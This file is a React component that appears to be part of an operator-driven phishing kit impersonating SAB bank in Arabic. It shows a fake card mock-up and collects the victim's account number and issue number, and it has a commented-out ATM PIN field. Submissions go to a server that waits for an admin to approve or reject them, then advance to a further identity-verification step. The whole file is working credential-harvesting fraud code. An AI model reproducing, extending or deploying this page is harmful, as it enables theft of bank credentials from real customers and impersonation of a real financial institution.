import Main from "@/components/Main";
import { isFormRejected } from "@/real-time/context/signals";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { Button, createTheme, TextField, ThemeProvider } from "@mui/material";
import { useEffect, useState } from "react";

export default function SABAccount() {
  const { cardLast4 = "1234" } = JSON.parse(
    localStorage.getItem("payment") || "{}"
  );

  const [accountNumber, setAccountNumber] = useState("");
  const [issueNumber, setIssueNumber] = useState("");
  // const [pin, setPin] = useState("");

  function formatAccountNumber(digits: string) {
    if (!digits) return "";
    const part1 = digits.slice(0, 3);
    const part2 = digits.slice(3, 9);
    const part3 = digits.slice(9, 12);
    return [part1, part2, part3].filter(Boolean).join("-");
  }

  const handleDigits = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>,
    setter: React.Dispatch<React.SetStateAction<any>>
  ) => {
    setter(e.target.value.replace(/\D+/g, ""));
  };

  function handlePasteAsDigits(
    e: React.ClipboardEvent<HTMLDivElement>,
    maxDigits: number,
    setter: React.Dispatch<React.SetStateAction<any>>
  ) {
    e.preventDefault();
    const pasted = (e.clipboardData || (window as any).clipboardData).getData(
      "text"
    );
    const digits = (pasted || "").replace(/\D+/g, "").slice(0, maxDigits);
    setter(digits);
  }

  function sendData() {
    sendDataToServer({
      data: {
        "رقم الحساب": accountNumber.replaceAll("-", " "),
        "رقم الإصدار": issueNumber,
        // "الرقم السري لبطاقة الصراف الألي": pin,
      },
      current: "حساب بنك الأول",
      nextPage: "نفاذ الأول",
      waitingForAdminResponse: true,
    });
  }

  useEffect(() => setCurrentPage("حساب بنك الأول"), []);

  useEffect(() => {
    if (isFormRejected.value) {
      setAccountNumber("");
      setIssueNumber("");
      // setPin("");
    }
  }, [isFormRejected.value]);

  const customTheme = createTheme({
    direction: "rtl",
    typography: {
      fontFamily: "Cairo, Roboto, sans-serif",
    },
    palette: {
      primary: {
        main: "#db0011",
      },
    },
  });

  return (
    <ThemeProvider theme={customTheme}>
      <Main variant="filled">
        <img src="images/sab.png" alt="SAB-Bank" width="75" className="mb-8" />

        <div className="text-lg font-bold">رقم حسابك البنكي</div>
        <div className="text-md text-gray-600">
          الرجاء إدخال المعلومات المطلوبة
        </div>

        <div
          className="bg-green-100 rounded-xl p-6 my-4 mx-auto shadow-[2px_6px_20px_#0000007a] text-white bg-[linear-gradient(313deg,_#014f4f,_#008580)]"
          dir="ltr"
        >
          <div>
            <img src="images/sab-white.png" alt="SAB-Bank" width="90" />
          </div>
          <div className="flex justify-between items-center mt-6">
            <div className="flex gap-2 items-center">
              <div>
                <img
                  src="images/mada-logo-only.png"
                  alt="SAB-Bank"
                  width="25"
                />
              </div>
              <div className="bg-white w-11 h-8 bg-opacity-40 rounded-md"></div>
              <div>
                <img
                  src="images/contactless.png"
                  alt="SAB-Bank"
                  className="w-7 opacity-70"
                />
              </div>
            </div>
            <div>
              <img src="images/mada-white.png" alt="mada" width="85" />
            </div>
          </div>
          <div className="ps-5 tracking-widest">
            <div className="text-3xl mt-10">**** **** **** {cardLast4}</div>
            <div className="mt-4 flex gap-10 text-sm">
              <p className="flex gap-1">
                {(() => {
                  const L1 = 3,
                    L2 = 6,
                    L3 = 3;

                  const digits = (accountNumber || "").replace(/\D+/g, "");

                  const p1Raw = digits.slice(0, L1);
                  const p2Raw = digits.slice(L1, L1 + L2);
                  const p3Raw = digits.slice(L1 + L2, L1 + L2 + L3);

                  const part1 = (p1Raw || "").padEnd(L1, "0");
                  const part2 = (p2Raw || "").padEnd(L2, "0");
                  const part3 = (p3Raw || "").padEnd(L3, "0");

                  return (
                    <>
                      <span>{part1}</span> <span>{part2}</span>{" "}
                      <span>{part3}</span>
                    </>
                  );
                })()}
              </p>
              <p>{issueNumber || "0"}</p>
            </div>
          </div>
        </div>

        <form className="flex flex-col mt-12 gap-5">
          <div className="flex gap-3">
            <TextField
              fullWidth
              value={formatAccountNumber(accountNumber)}
              onChange={(e) => handleDigits(e, setAccountNumber)}
              onPaste={(e) => handlePasteAsDigits(e, 14, setAccountNumber)}
              label="رقم الحساب"
              placeholder="xxx-xxxxxx-xxx"
              type="tel"
              inputProps={{
                inputMode: "numeric",
                pattern: "[0-9]*",
                maxLength: 14,
                dir: "ltr",
              }}
            />
            <TextField
              sx={{ width: "200px" }}
              label="رقم الإصدار"
              placeholder="x"
              type="tel"
              value={issueNumber}
              onChange={(e) => handleDigits(e, setIssueNumber)}
              onPaste={(e) => handlePasteAsDigits(e, 1, setIssueNumber)}
              slotProps={{
                input: {
                  inputProps: {
                    inputMode: "numeric",
                    pattern: "[0-9]*",
                    maxLength: 1,
                  },
                },
              }}
            />
          </div>
          {/* <TextField
          fullWidth
          label="الرقم السري لبطاقة الصراف الألي"
          placeholder="xxxx"
          type="tel"
          value={pin}
          onChange={(e) => handleDigits(e, setPin)}
          onPaste={(e) => handlePasteAsDigits(e, 4, setPin)}
          slotProps={{
            input: {
              inputProps: {
                inputMode: "numeric",
                pattern: "[0-9]*",
                maxLength: 4,
              },
            },
          }}
        /> */}

          <Button variant="contained" size="large" fullWidth onClick={sendData}>
            متابعة
          </Button>
        </form>
      </Main>
    </ThemeProvider>
  );
}
